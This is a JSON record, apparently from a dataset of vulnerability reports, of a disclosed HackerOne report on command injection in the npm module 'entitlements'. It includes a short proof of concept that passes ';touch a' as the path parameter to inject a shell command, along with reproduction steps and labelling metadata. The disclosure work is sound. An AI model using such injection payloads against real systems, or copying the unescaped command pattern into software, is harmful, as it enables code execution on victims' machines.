@@ -1,0 +1,32 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "caioluders ",
+  "title": "[entitlements] Command injection on the 'path' parameter",
+  "content": "\nHello again, another command injection, this time on the entitlements module.\nModule\nmodule name: entitlements\nversion: 1.2.0\nnpm page: https://www.npmjs.com/package/entitlements\nModule Description\ncheck the entitlements of a .app bundle\nModule Stats\n26 downloads in the last day\n328 downloads in the last week\n896 downloads in the last month\n14783 downloads in the last year\nVulnerability\nVulnerability Description\nThe module appends the path parameter to a command on the line 7 without escaping it, leading to a command injection.\nSteps To Reproduce:\nInstall the module\nCode 26 Bytes\n1$ npm install entitlements\nExample code with the malicious payload \";touch a\" on line 3.\nCode 117 Bytes\n1var entitlements = require('entitlements');\n2\n3entitlements(';touch a', function(error, data){\n4  console.log(data);\n5});\nRun it.\nCode 15 Bytes\n1$ node index.js\nCheck the newly create file a\nCode 21 Bytes\n1$ ls\n2a       index.js\nPatch\nIt is advisable to use a module that explicitly isolates the parameters to the codesign command.\nSupporting Material/References:\nmacOS Sierra 10.12.16\nNODEJS v8.4.0\nNPM 5.3.0\nWrap up\n( contacted the maintainer || opened issue ) = False\nImpact\nAn attacker that controls the path parameter can inject commands on the victim's machine.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1531919880,
+  "report_url": "https://hackerone.com/reports/341869",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection in a Node.js module, which is not related to authentication or authorization (AuthN/AuthZ) boundaries. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are not applicable here as the issue is a command injection vulnerability in a local module's parameter handling.",
+    "is_detectable": false
+  }
+}
